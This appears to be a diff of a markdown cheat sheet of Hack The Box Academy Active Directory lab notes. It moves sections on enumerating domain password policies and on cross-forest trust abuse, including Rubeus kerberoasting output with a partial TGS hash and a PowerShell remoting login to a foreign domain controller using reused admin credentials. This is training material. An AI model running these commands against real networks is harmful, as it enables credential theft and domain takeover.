@@ -377,333 +377,7 @@ for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
     do echo $x;
 done
 ```
-## Enumerating & Retrieving Password Policies
-### Enumerating the Password Policy - from Linux - Credentialed
-```
-Enumerating & Retrieving Password Policies
-mdmithu@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
 
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Dumping password info for domain: INLANEFREIGHT
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password length: 8
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password history length: 24
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  Maximum password age: Not Set
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password Complexity Flags: 000001
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Refuse Password Change: 0
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password Store Cleartext: 0
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password Lockout Admins: 0
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password No Clear Change: 0
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password No Anon Change: 0
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password Complex: 1
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password age: 1 day 4 minutes 
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  Reset Account Lockout Counter: 30 minutes 
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  Locked Account Duration: 30 minutes 
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  Account Lockout Threshold: 5
-SMB         172.16.5.5      445    ACADEMY-EA-DC01  Forced Log off Time: Not Set
-```
-```
-[/htb]$ rpcclient -U "" -N 172.16.5.5
-
-rpcclient $> querydominfo
-Domain:		INLANEFREIGHT
-Server:		
-Comment:	
-Total Users:	3650
-Total Groups:	0
-Total Aliases:	37
-Sequence No:	1
-Force Logoff:	-1
-Domain Server State:	0x1
-Server Role:	ROLE_DOMAIN_PDC
-Unknown 3:	0x1
-```
-```
-rpcclient $> querydominfo
-
-Domain:		INLANEFREIGHT
-Server:		
-Comment:	
-Total Users:	3650
-Total Groups:	0
-Total Aliases:	37
-Sequence No:	1
-Force Logoff:	-1
-Domain Server State:	0x1
-Server Role:	ROLE_DOMAIN_PDC
-Unknown 3:	0x1
-rpcclient $> getdompwinfo
-min_password_length: 8
-password_properties: 0x00000001
-	DOMAIN_PASSWORD_COMPLEX
-```
-```
-[/htb]$ enum4linux -P 172.16.5.5
-
-<SNIP>
-
- ================================================== 
-|    Password Policy Information for 172.16.5.5    |
- ================================================== 
-
-[+] Attaching to 172.16.5.5 using a NULL share
-[+] Trying protocol 139/SMB...
-
-	[!] Protocol failed: Cannot request session (Called Name:172.16.5.5)
-
-[+] Trying protocol 445/SMB...
-[+] Found domain(s):
-
-	[+] INLANEFREIGHT
-	[+] Builtin
-
-[+] Password Info for Domain: INLANEFREIGHT
-
-	[+] Minimum password length: 8
-	[+] Password history length: 24
-	[+] Maximum password age: Not Set
-	[+] Password Complexity Flags: 000001
-
-		[+] Domain Refuse Password Change: 0
-		[+] Domain Password Store Cleartext: 0
-		[+] Domain Password Lockout Admins: 0
-		[+] Domain Password No Clear Change: 0
-		[+] Domain Password No Anon Change: 0
-		[+] Domain Password Complex: 1
-
-	[+] Minimum password age: 1 day 4 minutes 
-	[+] Reset Account Lockout Counter: 30 minutes 
-	[+] Locked Account Duration: 30 minutes 
-	[+] Account Lockout Threshold: 5
-	[+] Forced Log off Time: Not Set
-
-[+] Retieved partial password policy with rpcclient:
-
-Password Complexity: Enabled
-Minimum Password Length: 8
-
-enum4linux complete on Tue Feb 22 17:39:29 2022
-```
-```
-[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight
-
-ENUM4LINUX - next generation
-
-<SNIP>
-
- =======================================
-|    RPC Session Check on 172.16.5.5    |
- =======================================
-[*] Check for null session
-[+] Server allows session using username '', password ''
-[*] Check for random user session
-[-] Could not establish random user session: STATUS_LOGON_FAILURE
-
- =================================================
-|    Domain Information via RPC for 172.16.5.5    |
- =================================================
-[+] Domain: INLANEFREIGHT
-[+] SID: S-1-5-21-3842939050-3880317879-2865463114
-[+] Host is part of a domain (not a workgroup)
- =========================================================
-|    Domain Information via SMB session for 172.16.5.5    |
-========================================================
-[*] Enumerating via unauthenticated SMB session on 445/tcp
-[+] Found domain information via SMB
-NetBIOS computer name: ACADEMY-EA-DC01
-NetBIOS domain name: INLANEFREIGHT
-DNS domain: INLANEFREIGHT.LOCAL
-FQDN: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-
- =======================================
-|    Policies via RPC for 172.16.5.5    |
- =======================================
-[*] Trying port 445/tcp
-[+] Found policy:
-domain_password_information:
-  pw_history_length: 24
-  min_pw_length: 8
-  min_pw_age: 1 day 4 minutes
-  max_pw_age: not set
-  pw_properties:
-  - DOMAIN_PASSWORD_COMPLEX: true
-  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
-  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
-  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
-  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
-  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
-domain_lockout_information:
-  lockout_observation_window: 30 minutes
-  lockout_duration: 30 minutes
-  lockout_threshold: 5
-domain_logoff_information:
-  force_logoff_time: not set
-
-Completed after 5.41 seconds
-```
-```
-Enumerating & Retrieving Password Policies
-
-C:\htb> net use \\DC01\ipc$ "" /u:""
-The command completed successfully.
-```
-```
-C:\htb> net use \\DC01\ipc$ "" /u:guest
-System error 1331 has occurred.
-
-This user can't sign in because this account is currently disabled.
-```
-```
-C:\htb> net use \\DC01\ipc$ "password" /u:guest
-System error 1326 has occurred.
-
-The user name or password is incorrect.
-```
-```
-C:\htb> net use \\DC01\ipc$ "password" /u:guest
-System error 1909 has occurred.
-
-The referenced account is currently locked out and may not be logged on to.
-```
-```
-[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
-
-forceLogoff: -9223372036854775808
-lockoutDuration: -18000000000
-lockOutObservationWindow: -18000000000
-lockoutThreshold: 5
-maxPwdAge: -9223372036854775808
-minPwdAge: -864000000000
-minPwdLength: 8
-modifiedCountAtLastProm: 0
-nextRid: 1002
-pwdProperties: 1
-pwdHistoryLength: 24
-```
-```
-  Enumerating & Retrieving Password Policies
-C:\htb> net accounts
-
-Force user logoff how long after time expires?:       Never
-Minimum password age (days):                          1
-Maximum password age (days):                          Unlimited
-Minimum password length:                              8
-Length of password history maintained:                24
-Lockout threshold:                                    5
-Lockout duration (minutes):                           30
-Lockout observation window (minutes):                 30
-Computer role:                                        SERVER
-The command completed successfully.
-```
-```
-PS C:\htb> import-module .\PowerView.ps1
-PS C:\htb> Get-DomainPolicy
-
-Unicode        : @{Unicode=yes}
-SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
-                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
-                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
-                 LSAAnonymousNameLookup=0}
-KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
-Version        : @{signature="$CHICAGO$"; Revision=1}
-RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
-Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
-                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
-GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
-GPODisplayName : Default Domain Policy
-```
-
-## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
-```
-Enumerating Accounts for Associated SPNs Using Get-DomainUser
-
-PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
-
-samaccountname
---------------
-krbtgt
-mssqlsvc
-```
-```
-Enumerating the mssqlsvc Account
-
-PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
-
-samaccountname memberof
--------------- --------
-mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
-```
-```
-Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
-
-PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
-
-   ______        _
-  (_____ \      | |
-   _____) )_   _| |__  _____ _   _  ___
-  |  __  /| | | |  _ \| ___ | | | |/___)
-  | |  \ \| |_| | |_) ) ____| |_| |___ |
-  |_|   |_|____/|____/|_____)____/(___/
-
-  v2.0.2
-
-[*] Action: Kerberoasting
-
-[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
-[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
-
-[*] Target User            : mssqlsvc
-[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
-[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
-
-[*] Total kerberoastable users : 1
-
-[*] SamAccountName         : mssqlsvc
-[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
-[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
-[*] PwdLastSet             : 3/24/2022 12:47:52 PM
-[*] Supported ETypes       : RC4_HMAC_DEFAULT
-[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstic
-```
-#### Admin Password Re-Use & Group Membership
-```
-Using Get-DomainForeignGroupMember
-
-PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
-
-GroupDomain             : FREIGHTLOGISTICS.LOCAL
-GroupName               : Administrators
-GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
-MemberDomain            : FREIGHTLOGISTICS.LOCAL
-MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
-MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
-                          TICS,DC=LOCAL
-
-PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
-
-INLANEFREIGHT\administrator
-```
-```
-Accessing DC03 Using Enter-PSSession
-
-PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
-
-[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
-inlanefreight\administrator
-
-[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all
-
-Windows IP Configuration
-
-   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
-   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
-   Node Type . . . . . . . . . . . . : Hybrid
-   IP Routing Enabled. . . . . . . . : No
-   WINS Proxy Enabled. . . . . . . . : No
-   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
-```
 ## Enumerating & Retrieving Password Policies
 ```
 mdmithu@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
@@ -3779,7 +3453,95 @@ Supplemental Credentials:
 
 
 
+## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+```
+Enumerating Accounts for Associated SPNs Using Get-DomainUser
 
+PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+krbtgt
+mssqlsvc
+```
+```
+Enumerating the mssqlsvc Account
+
+PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+
+samaccountname memberof
+-------------- --------
+mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+```
+```
+Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+
+PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : mssqlsvc
+[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+[*] SamAccountName         : mssqlsvc
+[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
+[*] PwdLastSet             : 3/24/2022 12:47:52 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstic
+```
+#### Admin Password Re-Use & Group Membership
+```
+Using Get-DomainForeignGroupMember
+
+PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+
+GroupDomain             : FREIGHTLOGISTICS.LOCAL
+GroupName               : Administrators
+GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
+MemberDomain            : FREIGHTLOGISTICS.LOCAL
+MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
+MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
+                          TICS,DC=LOCAL
+
+PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+
+INLANEFREIGHT\administrator
+```
+```
+Accessing DC03 Using Enter-PSSession
+
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+inlanefreight\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
+   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
+```
 ## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
 ```
 Cross-Forest Kerberoasting
